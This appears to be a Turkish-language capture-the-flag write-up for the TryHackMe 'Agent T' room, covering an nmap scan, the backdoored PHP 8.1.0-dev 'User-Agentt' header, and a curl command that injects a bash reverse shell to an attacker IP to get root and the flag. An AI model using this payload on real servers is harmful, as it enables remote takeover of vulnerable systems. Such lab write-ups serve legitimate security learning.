---
title: 'TryHackMe | Agent T WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [remote code execution]
render_with_liquid: false
---

## Özet

Nmap taramasının sonucunda web uygulamasının PHP'nin 8.1.0-dev sürümünü kullandığını öğreniyor ve yaptığımız kısa bir araştırmadan sonra `user-agentt` parametresi ile beraber komut çalıştırabilmemizi sağlayan bir güvenlik açığı olduğunu öğreniyoruz.

## Keşif aşaması

### Nmap taraması

```console
$nmap -sVC -T4 10.10.105.29
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

```

Tarama sonucunda 80 (HTTP) numaralı portun açık olduğunu ve üzerinde PHP'nin 8.1.0-dev sürümünün çalıştığını öğreniyoruz.

## Sömürü aşaması

Kullanılan PHP sürümünü google'da arattıktan sonra python ile yazılmış [bu](https://www.exploit-db.com/exploits/49933) exploit ile karşılaşıyoruz. Anlaşılacağı üzere header'a eklenen `user-agentt` parametresinden yararlanarak sistemde komut çalıştırabiliyoruz. Curl aracından yararlanarak sistemden shell elde edebileceğimiz bir komut gönderelim.

```
$ curl -s 10.10.105.29 -H 'User-Agentt: zerodiumsystem("bash -c \" /bin/bash -i >& /dev/tcp/10.21.66.61/1234 0>&1\"");'
```

`1234` numaralı portu ncat ile dinlemeye aldıktan sonra yukarıdaki komutu çalıştırıyor ve sistemden root yetkisinde bir shell elde ediyoruz. Sonra ise bayrağı ana dizinden yani `/flag.txt` adresinden alıyoruz.
